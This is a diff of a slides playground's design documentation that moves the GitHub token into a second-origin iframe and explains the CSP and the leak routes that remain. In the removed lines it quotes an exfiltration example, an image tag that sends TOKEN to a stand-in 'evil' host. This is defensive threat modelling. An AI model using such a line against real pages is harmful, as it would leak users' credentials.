@@ -281,9 +281,10 @@ The Versions pane (Home ▸ Versions) lists them:
   side, with F7 for the next change;
 - Restore is one step of Undo.
 
-The **GitHub pane** (`gitvm.go`, `scene_git.go`, `cmd/playground-wasm/git.go`;
-Home ▸ GitHub) uses [go-browserhttp/browsergit](https://github.com/go-browserhttp/browsergit)'s
-REST adapter, straight to api.github.com with no proxy:
+The **GitHub pane** (`gitvm.go`, `gitframe.go`, `scene_git.go`,
+`cmd/playground-wasm/gitframe.go`; Home ▸ GitHub) goes through the git frame
+below, whose module uses [go-browserhttp/browsergit](https://github.com/go-browserhttp/browsergit)'s
+REST adapter, straight to the forge's API with no proxy:
 - Load reads a repository folder holding `deck.md` (one step of Undo, kept as a
   "From GitHub" version);
 - Propose changes… creates a NEW branch `slides/<title>-<time>` and a pull
@@ -291,59 +292,53 @@ REST adapter, straight to api.github.com with no proxy:
 - Check for changes compares GitHub's newer version with yours; Take theirs
   loads it.
 
-The token (a fine-grained PAT: Contents and Pull requests read/write) is typed
-into a masked field and held in a `secret.Token` in the page's instance of the
-module only: never the render worker, the preview frames, the draft, the
-versions, a share link or an export. "Remember on this device" (localStorage)
-is the one opt-in; Disconnect and Forget my drafts drop it. The page's CSP is
-`default-src 'self'` with `connect-src 'self' https://api.github.com
-https://gitlab.com`, no object, form or `<base>`, workers and frames from the
-page only, scripts from the page (and `wasm-unsafe-eval`, never `unsafe-eval`):
-a script injected into the page cannot send a token out by fetch, XHR, a
-beacon, a form, a frame, an object, a worker or a script from another host.
-It can still send it as the URL of an image, a style sheet or a media file: the
-preview frames are `srcdoc` iframes, which inherit the page's policy, so
-`img-src`, `media-src`, `style-src` and `font-src` must allow the https images,
-style sheets and media a deck links. A preview served from a URL of its own
-(the only kind of frame that gets a policy of its own: `blob:` and `data:`
-frames inherit too, measured in Chrome) would not close them: the page hands
-that frame the deck, and a script injected into the page can hand it
-`<img src="https://evil/?t=TOKEN">` as well. Also open whatever the policy
-says: top-level navigation, `window.open` (`navigate-to` shipped in no
-browser) and, in part, DNS prefetch (`x-dns-prefetch-control: off`).
-`gitvm_test.go` (`TestPlaygroundPageCSP`), `browsertest/csp.cjs` and
-`browsertest/git.cjs` sweep every store, message and request for the token and
-probe the policy. A script injected into the page itself could still read the
-token (RFC 10017); the self-hosted server mode keeps tokens server-side.
+**The token is not in this page** (go-slides#90). In client mode the pane holds
+no token and makes no forge call. A document on a second origin,
+[go-slides-usercontent.github.io](https://github.com/go-slides-usercontent/go-slides-usercontent.github.io)
+(github.io is on the Public Suffix List, so a site of its own with storage of
+its own), is embedded over the pane in an iframe. The token (a fine-grained
+PAT: Contents and Pull requests read/write) is typed into a password input of
+**that** document; it makes the forge calls, keeps the token in its own
+`localStorage` only when "Remember on this device" is ticked, does the GitLab
+redirect sign-in (a popup of its own origin, PKCE) and answers typed
+`postMessage` commands from this page: `load`, `propose`, `refresh`,
+`disconnect`, `status`. The page's side is a `remote.Remote` that sends those
+commands (`gitframe.go`), so Load, Propose changes… (a NEW branch `slides/…`
+chosen by the frame, never forced) and Check for changes work as before. There
+is no command that takes or returns a token: a script injected into the page
+finds none, in memory, in storage or in a message, and cannot read the frame
+(another origin). It can still send the typed commands, as it always could: read
+the loaded folder, propose a branch and a pull request with the connected token.
+A token an earlier version kept in this origin's `localStorage` is removed at
+first load, unused, and the pane says so; Forget my drafts disconnects the frame.
 
-**The git frame on a second origin** (go-slides#90). The fix that removes the
-secret instead of closing routes is a document that holds the token and that the
-page cannot read. It is built, deployed and gated, and **the page does not use it
-yet**: [go-slides-usercontent.github.io](https://github.com/go-slides-usercontent/go-slides-usercontent.github.io)
-(a site of its own: github.io is on the Public Suffix List) holds the forge token
-in a real password input, keeps it in its own `localStorage` on "Remember on this
-device", does the GitLab redirect sign-in in a popup of its own origin (PKCE), and
-answers typed `postMessage` commands (`load`, `propose`, `refresh`, `disconnect`,
-`status`) from this page's origin only, with a nonce. Its Chrome test shows the
-page cannot read the frame's DOM or storage and never receives a token. Until the
-Git pane talks to it, the paragraphs above describe what the page does.
-`.second-origin.json` declares the origin and the `second-origin` CI job
-(`secondorigin verify`) fails when the published shell drifts from it (its CSP, the
-origins it accepts) or the origin disappears.
+The page's CSP is `default-src 'self'` with `connect-src 'self'` (no forge),
+`frame-src 'self' blob:` and the frame's origin, no object, form or `<base>`,
+workers from the page only, scripts from the page (and `wasm-unsafe-eval`, never
+`unsafe-eval`): a script injected into the page cannot send anything out by
+fetch, XHR, a beacon, a form, a frame, an object, a worker or a script from
+another host. It can still send what the page holds as the URL of an image, a
+style sheet or a media file: the preview frames are `srcdoc` iframes, which
+inherit the page's policy, so `img-src`, `media-src`, `style-src` and `font-src`
+must allow the https images, style sheets and media a deck links. What it holds
+no longer includes a forge token. Also open whatever the policy says: top-level
+navigation, `window.open` (`navigate-to` shipped in no browser) and, in part, DNS
+prefetch (`x-dns-prefetch-control: off`). `gitvm_test.go`
+(`TestPlaygroundPageCSP`), `gitframe_test.go`, `browsertest/csp.cjs` and
+`browsertest/git.cjs` probe the policy and search the page's memory, stores and
+messages for the token, in Chrome, with the frame served from a second loopback
+origin. `.second-origin.json` declares the frame's origin and the `second origin
+verified` CI job (`secondorigin verify`) fails when the published frame drifts
+from it (its CSP, the origins it accepts) or the origin disappears. The frame's
+own tests (PKCE sign-in, GitLab, schema, nonce) are in its repository.
 
-**GitLab.com** (`gitoauth.go`): the pane's forge list also offers GitLab, with a
-personal access token (scope `api`) or **Sign in with GitLab** — the
-authorization code flow with PKCE for a public client
-(`browsergit/oauth`, RFC 7636 / RFC 9700). The state and verifier of an
-attempt wait in this tab's sessionStorage, are read and deleted on the way
-back after the URL has been cleaned; the exact redirect URI is checked before
-any request; the tokens stay in memory, are refreshed (rotated) before they
-expire, and Disconnect revokes both. The page sends no referrer, and its CSP
-allows `https://gitlab.com` besides api.github.com. Sign-in is on once
-`params.gitlabClientID` names a GitLab application (not a secret): register
-one at gitlab.com ▸ Preferences ▸ Applications, **not confidential**, scope
-`api`, with every language's playground page as a redirect URI
-(`https://go-slides.github.io/playground/`, `…/fr/playground/`, …).
+**GitLab.com**: the frame's forge list offers GitLab, with a personal access
+token (scope `api`) or **Sign in with GitLab** (authorization code flow with
+PKCE for a public client; `browsergit/oauth`, RFC 7636 / RFC 9700), in the
+frame. Sign-in is on once its Pages workflow names a GitLab application (not a
+secret): register one at gitlab.com ▸ Preferences ▸ Applications, **not
+confidential**, scope `api`, with the redirect URI
+`https://go-slides-usercontent.github.io/callback.html` (one for all languages).
 
 **Server mode** (`gitdvm.go`, `scene_gitd.go`): served behind a self-hosted
 [slides-gitd](https://github.com/go-slides/gitd) on its own origin, the page
